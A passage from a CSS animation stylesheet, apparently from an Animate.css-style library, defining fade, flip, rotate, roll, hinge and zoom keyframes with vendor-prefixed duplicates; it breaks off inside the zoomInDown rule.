            @-webkit-keyframes fadeInRightBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(2000px, 0, 0);
                    transform: translate3d(2000px, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInRightBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(2000px, 0, 0);
                    transform: translate3d(2000px, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInRightBig {
                -webkit-animation-name: fadeInRightBig;
                animation-name: fadeInRightBig;
            }
            @-webkit-keyframes fadeInUp {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 100%, 0);
                    transform: translate3d(0, 100%, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInUp {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 100%, 0);
                    transform: translate3d(0, 100%, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInUp {
                -webkit-animation-name: fadeInUp;
                animation-name: fadeInUp;
            }
            @-webkit-keyframes fadeInUpBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 2000px, 0);
                    transform: translate3d(0, 2000px, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInUpBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 2000px, 0);
                    transform: translate3d(0, 2000px, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInUpBig {
                -webkit-animation-name: fadeInUpBig;
                animation-name: fadeInUpBig;
            }
            @-webkit-keyframes fadeOut {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                }
            }
            @keyframes fadeOut {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                }
            }
            .fadeOut {
                -webkit-animation-name: fadeOut;
                animation-name: fadeOut;
            }
            @-webkit-keyframes fadeOutDown {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 100%, 0);
                    transform: translate3d(0, 100%, 0);
                }
            }
            @keyframes fadeOutDown {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 100%, 0);
                    transform: translate3d(0, 100%, 0);
                }
            }
            .fadeOutDown {
                -webkit-animation-name: fadeOutDown;
                animation-name: fadeOutDown;
            }
            @-webkit-keyframes fadeOutDownBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 2000px, 0);
                    transform: translate3d(0, 2000px, 0);
                }
            }
            @keyframes fadeOutDownBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 2000px, 0);
                    transform: translate3d(0, 2000px, 0);
                }
            }
            .fadeOutDownBig {
                -webkit-animation-name: fadeOutDownBig;
                animation-name: fadeOutDownBig;
            }
            @-webkit-keyframes fadeOutLeft {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(-100%, 0, 0);
                    transform: translate3d(-100%, 0, 0);
                }
            }
            @keyframes fadeOutLeft {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(-100%, 0, 0);
                    transform: translate3d(-100%, 0, 0);
                }
            }
            .fadeOutLeft {
                -webkit-animation-name: fadeOutLeft;
                animation-name: fadeOutLeft;
            }
            @-webkit-keyframes fadeOutLeftBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(-2000px, 0, 0);
                    transform: translate3d(-2000px, 0, 0);
                }
            }
            @keyframes fadeOutLeftBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(-2000px, 0, 0);
                    transform: translate3d(-2000px, 0, 0);
                }
            }
            .fadeOutLeftBig {
                -webkit-animation-name: fadeOutLeftBig;
                animation-name: fadeOutLeftBig;
            }
            @-webkit-keyframes fadeOutRight {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(100%, 0, 0);
                    transform: translate3d(100%, 0, 0);
                }
            }
            @keyframes fadeOutRight {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(100%, 0, 0);
                    transform: translate3d(100%, 0, 0);
                }
            }
            .fadeOutRight {
                -webkit-animation-name: fadeOutRight;
                animation-name: fadeOutRight;
            }
            @-webkit-keyframes fadeOutRightBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(2000px, 0, 0);
                    transform: translate3d(2000px, 0, 0);
                }
            }
            @keyframes fadeOutRightBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(2000px, 0, 0);
                    transform: translate3d(2000px, 0, 0);
                }
            }
            .fadeOutRightBig {
                -webkit-animation-name: fadeOutRightBig;
                animation-name: fadeOutRightBig;
            }
            @-webkit-keyframes fadeOutUp {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -100%, 0);
                    transform: translate3d(0, -100%, 0);
                }
            }
            @keyframes fadeOutUp {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -100%, 0);
                    transform: translate3d(0, -100%, 0);
                }
            }
            .fadeOutUp {
                -webkit-animation-name: fadeOutUp;
                animation-name: fadeOutUp;
            }
            @-webkit-keyframes fadeOutUpBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -2000px, 0);
                    transform: translate3d(0, -2000px, 0);
                }
            }
            @keyframes fadeOutUpBig {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -2000px, 0);
                    transform: translate3d(0, -2000px, 0);
                }
            }
            .fadeOutUpBig {
                -webkit-animation-name: fadeOutUpBig;
                animation-name: fadeOutUpBig;
            }
            @-webkit-keyframes flip {
                0% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
                    -webkit-animation-timing-function: ease-out;
                    animation-timing-function: ease-out;
                }
                40% {
                    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
                    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
                    -webkit-animation-timing-function: ease-out;
                    animation-timing-function: ease-out;
                }
                50% {
                    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
                    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                80% {
                    -webkit-transform: perspective(400px) scale3d(0.95, 0.95, 0.95);
                    transform: perspective(400px) scale3d(0.95, 0.95, 0.95);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                100% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
            }
            @keyframes flip {
                0% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
                    -webkit-animation-timing-function: ease-out;
                    animation-timing-function: ease-out;
                }
                40% {
                    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
                    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
                    -webkit-animation-timing-function: ease-out;
                    animation-timing-function: ease-out;
                }
                50% {
                    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
                    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                80% {
                    -webkit-transform: perspective(400px) scale3d(0.95, 0.95, 0.95);
                    transform: perspective(400px) scale3d(0.95, 0.95, 0.95);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                100% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
            }
            .animated.flip {
                -webkit-backface-visibility: visible;
                backface-visibility: visible;
                -webkit-animation-name: flip;
                animation-name: flip;
            }
            @-webkit-keyframes flipInX {
                0% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                    opacity: 0;
                }
                40% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                60% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
                    opacity: 1;
                }
                80% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
                }
                100% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
            }
            @keyframes flipInX {
                0% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                    opacity: 0;
                }
                40% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                60% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
                    opacity: 1;
                }
                80% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
                }
                100% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
            }
            .flipInX {
                -webkit-backface-visibility: visible !important;
                backface-visibility: visible !important;
                -webkit-animation-name: flipInX;
                animation-name: flipInX;
            }
            @-webkit-keyframes flipInY {
                0% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                    opacity: 0;
                }
                40% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                60% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
                    opacity: 1;
                }
                80% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
                }
                100% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
            }
            @keyframes flipInY {
                0% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                    opacity: 0;
                }
                40% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
                    -webkit-animation-timing-function: ease-in;
                    animation-timing-function: ease-in;
                }
                60% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
                    opacity: 1;
                }
                80% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
                }
                100% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
            }
            .flipInY {
                -webkit-backface-visibility: visible !important;
                backface-visibility: visible !important;
                -webkit-animation-name: flipInY;
                animation-name: flipInY;
            }
            @-webkit-keyframes flipOutX {
                0% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
                30% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    opacity: 1;
                }
                100% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    opacity: 0;
                }
            }
            @keyframes flipOutX {
                0% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
                30% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
                    opacity: 1;
                }
                100% {
                    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
                    opacity: 0;
                }
            }
            .flipOutX {
                -webkit-animation-name: flipOutX;
                animation-name: flipOutX;
                -webkit-backface-visibility: visible !important;
                backface-visibility: visible !important;
            }
            @-webkit-keyframes flipOutY {
                0% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
                30% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
                    opacity: 1;
                }
                100% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    opacity: 0;
                }
            }
            @keyframes flipOutY {
                0% {
                    -webkit-transform: perspective(400px);
                    transform: perspective(400px);
                }
                30% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, -15deg);
                    opacity: 1;
                }
                100% {
                    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
                    opacity: 0;
                }
            }
            .flipOutY {
                -webkit-backface-visibility: visible !important;
                backface-visibility: visible !important;
                -webkit-animation-name: flipOutY;
                animation-name: flipOutY;
            }
            @-webkit-keyframes lightSpeedIn {
                0% {
                    -webkit-transform: translate3d(100%, 0, 0) skewX(-30deg);
                    transform: translate3d(100%, 0, 0) skewX(-30deg);
                    opacity: 0;
                }
                60% {
                    -webkit-transform: skewX(20deg);
                    transform: skewX(20deg);
                    opacity: 1;
                }
                80% {
                    -webkit-transform: skewX(-5deg);
                    transform: skewX(-5deg);
                    opacity: 1;
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            @keyframes lightSpeedIn {
                0% {
                    -webkit-transform: translate3d(100%, 0, 0) skewX(-30deg);
                    transform: translate3d(100%, 0, 0) skewX(-30deg);
                    opacity: 0;
                }
                60% {
                    -webkit-transform: skewX(20deg);
                    transform: skewX(20deg);
                    opacity: 1;
                }
                80% {
                    -webkit-transform: skewX(-5deg);
                    transform: skewX(-5deg);
                    opacity: 1;
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            .lightSpeedIn {
                -webkit-animation-name: lightSpeedIn;
                animation-name: lightSpeedIn;
                -webkit-animation-timing-function: ease-out;
                animation-timing-function: ease-out;
            }
            @-webkit-keyframes lightSpeedOut {
                0% {
                    opacity: 1;
                }
                100% {
                    -webkit-transform: translate3d(100%, 0, 0) skewX(30deg);
                    transform: translate3d(100%, 0, 0) skewX(30deg);
                    opacity: 0;
                }
            }
            @keyframes lightSpeedOut {
                0% {
                    opacity: 1;
                }
                100% {
                    -webkit-transform: translate3d(100%, 0, 0) skewX(30deg);
                    transform: translate3d(100%, 0, 0) skewX(30deg);
                    opacity: 0;
                }
            }
            .lightSpeedOut {
                -webkit-animation-name: lightSpeedOut;
                animation-name: lightSpeedOut;
                -webkit-animation-timing-function: ease-in;
                animation-timing-function: ease-in;
            }
            @-webkit-keyframes rotateIn {
                0% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    -webkit-transform: rotate3d(0, 0, 1, -200deg);
                    transform: rotate3d(0, 0, 1, -200deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            @keyframes rotateIn {
                0% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    -webkit-transform: rotate3d(0, 0, 1, -200deg);
                    transform: rotate3d(0, 0, 1, -200deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            .rotateIn {
                -webkit-animation-name: rotateIn;
                animation-name: rotateIn;
            }
            @-webkit-keyframes rotateInDownLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -45deg);
                    transform: rotate3d(0, 0, 1, -45deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            @keyframes rotateInDownLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -45deg);
                    transform: rotate3d(0, 0, 1, -45deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            .rotateInDownLeft {
                -webkit-animation-name: rotateInDownLeft;
                animation-name: rotateInDownLeft;
            }
            @-webkit-keyframes rotateInDownRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 45deg);
                    transform: rotate3d(0, 0, 1, 45deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            @keyframes rotateInDownRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 45deg);
                    transform: rotate3d(0, 0, 1, 45deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            .rotateInDownRight {
                -webkit-animation-name: rotateInDownRight;
                animation-name: rotateInDownRight;
            }
            @-webkit-keyframes rotateInUpLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 45deg);
                    transform: rotate3d(0, 0, 1, 45deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            @keyframes rotateInUpLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 45deg);
                    transform: rotate3d(0, 0, 1, 45deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            .rotateInUpLeft {
                -webkit-animation-name: rotateInUpLeft;
                animation-name: rotateInUpLeft;
            }
            @-webkit-keyframes rotateInUpRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -90deg);
                    transform: rotate3d(0, 0, 1, -90deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            @keyframes rotateInUpRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -90deg);
                    transform: rotate3d(0, 0, 1, -90deg);
                    opacity: 0;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: none;
                    transform: none;
                    opacity: 1;
                }
            }
            .rotateInUpRight {
                -webkit-animation-name: rotateInUpRight;
                animation-name: rotateInUpRight;
            }
            @-webkit-keyframes rotateOut {
                0% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    -webkit-transform: rotate3d(0, 0, 1, 200deg);
                    transform: rotate3d(0, 0, 1, 200deg);
                    opacity: 0;
                }
            }
            @keyframes rotateOut {
                0% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: center;
                    transform-origin: center;
                    -webkit-transform: rotate3d(0, 0, 1, 200deg);
                    transform: rotate3d(0, 0, 1, 200deg);
                    opacity: 0;
                }
            }
            .rotateOut {
                -webkit-animation-name: rotateOut;
                animation-name: rotateOut;
            }
            @-webkit-keyframes rotateOutDownLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 45deg);
                    transform: rotate3d(0, 0, 1, 45deg);
                    opacity: 0;
                }
            }
            @keyframes rotateOutDownLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 45deg);
                    transform: rotate3d(0, 0, 1, 45deg);
                    opacity: 0;
                }
            }
            .rotateOutDownLeft {
                -webkit-animation-name: rotateOutDownLeft;
                animation-name: rotateOutDownLeft;
            }
            @-webkit-keyframes rotateOutDownRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -45deg);
                    transform: rotate3d(0, 0, 1, -45deg);
                    opacity: 0;
                }
            }
            @keyframes rotateOutDownRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -45deg);
                    transform: rotate3d(0, 0, 1, -45deg);
                    opacity: 0;
                }
            }
            .rotateOutDownRight {
                -webkit-animation-name: rotateOutDownRight;
                animation-name: rotateOutDownRight;
            }
            @-webkit-keyframes rotateOutUpLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -45deg);
                    transform: rotate3d(0, 0, 1, -45deg);
                    opacity: 0;
                }
            }
            @keyframes rotateOutUpLeft {
                0% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: left bottom;
                    transform-origin: left bottom;
                    -webkit-transform: rotate3d(0, 0, 1, -45deg);
                    transform: rotate3d(0, 0, 1, -45deg);
                    opacity: 0;
                }
            }
            .rotateOutUpLeft {
                -webkit-animation-name: rotateOutUpLeft;
                animation-name: rotateOutUpLeft;
            }
            @-webkit-keyframes rotateOutUpRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 90deg);
                    transform: rotate3d(0, 0, 1, 90deg);
                    opacity: 0;
                }
            }
            @keyframes rotateOutUpRight {
                0% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    opacity: 1;
                }
                100% {
                    -webkit-transform-origin: right bottom;
                    transform-origin: right bottom;
                    -webkit-transform: rotate3d(0, 0, 1, 90deg);
                    transform: rotate3d(0, 0, 1, 90deg);
                    opacity: 0;
                }
            }
            .rotateOutUpRight {
                -webkit-animation-name: rotateOutUpRight;
                animation-name: rotateOutUpRight;
            }
            @-webkit-keyframes hinge {
                0% {
                    -webkit-transform-origin: top left;
                    transform-origin: top left;
                    -webkit-animation-timing-function: ease-in-out;
                    animation-timing-function: ease-in-out;
                }
                20%,
                60% {
                    -webkit-transform: rotate3d(0, 0, 1, 80deg);
                    transform: rotate3d(0, 0, 1, 80deg);
                    -webkit-transform-origin: top left;
                    transform-origin: top left;
                    -webkit-animation-timing-function: ease-in-out;
                    animation-timing-function: ease-in-out;
                }
                40%,
                80% {
                    -webkit-transform: rotate3d(0, 0, 1, 60deg);
                    transform: rotate3d(0, 0, 1, 60deg);
                    -webkit-transform-origin: top left;
                    transform-origin: top left;
                    -webkit-animation-timing-function: ease-in-out;
                    animation-timing-function: ease-in-out;
                    opacity: 1;
                }
                100% {
                    -webkit-transform: translate3d(0, 700px, 0);
                    transform: translate3d(0, 700px, 0);
                    opacity: 0;
                }
            }
            @keyframes hinge {
                0% {
                    -webkit-transform-origin: top left;
                    transform-origin: top left;
                    -webkit-animation-timing-function: ease-in-out;
                    animation-timing-function: ease-in-out;
                }
                20%,
                60% {
                    -webkit-transform: rotate3d(0, 0, 1, 80deg);
                    transform: rotate3d(0, 0, 1, 80deg);
                    -webkit-transform-origin: top left;
                    transform-origin: top left;
                    -webkit-animation-timing-function: ease-in-out;
                    animation-timing-function: ease-in-out;
                }
                40%,
                80% {
                    -webkit-transform: rotate3d(0, 0, 1, 60deg);
                    transform: rotate3d(0, 0, 1, 60deg);
                    -webkit-transform-origin: top left;
                    transform-origin: top left;
                    -webkit-animation-timing-function: ease-in-out;
                    animation-timing-function: ease-in-out;
                    opacity: 1;
                }
                100% {
                    -webkit-transform: translate3d(0, 700px, 0);
                    transform: translate3d(0, 700px, 0);
                    opacity: 0;
                }
            }
            .hinge {
                -webkit-animation-name: hinge;
                animation-name: hinge;
            }
            @-webkit-keyframes rollIn {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
                    transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes rollIn {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
                    transform: translate3d(-100%, 0, 0) rotate3d(0, 0, 1, -120deg);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .rollIn {
                -webkit-animation-name: rollIn;
                animation-name: rollIn;
            }
            @-webkit-keyframes rollOut {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
                    transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
                }
            }
            @keyframes rollOut {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
                    transform: translate3d(100%, 0, 0) rotate3d(0, 0, 1, 120deg);
                }
            }
            .rollOut {
                -webkit-animation-name: rollOut;
                animation-name: rollOut;
            }
            @-webkit-keyframes zoomIn {
                0% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.3, 0.3, 0.3);
                    transform: scale3d(0.3, 0.3, 0.3);
                }
                50% {
                    opacity: 1;
                }
            }
            @keyframes zoomIn {
                0% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.3, 0.3, 0.3);
                    transform: scale3d(0.3, 0.3, 0.3);
                }
                50% {
                    opacity: 1;
                }
            }
            .zoomIn {
                -webkit-animation-name: zoomIn;
                animation-name: zoomIn;
            }
            @-webkit-keyframes zoomInDown {
                0% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.1, 0.1, 0.1) translate3d(0, -1000px, 0);
                    transform: scale3d(0.1, 0.1, 0.1) translate3d(0, -1000px, 0);
                    -webkit-animation-timing-function: cubic-bezier(0.55, 0.055, 0.675, 0.19);
                    animation-timing-function: cubic-bezier(0.55, 0.055, 0.675, 0.19);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: scale3d(0.475, 0.475, 0.475) translate3d(0, 60px, 0);
                    transform: scale3d(0.475, 0.475, 0.475) translate3d(0, 60px, 0);
                    -webkit-animation-timing-function: cubic-bezier(0.175, 0.885, 0.32, 1);
                    animation-timing-function: cubic-bezier(0.175, 0.885, 0.32, 1);
                }
            }
            @keyframes zoomInDown {
                0% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.1, 0.1, 0.1) translate3d(0, -1000px, 0);
                    transform: scale3d(0.1, 0.1, 0.1) translate3d(0, -1000px, 0);
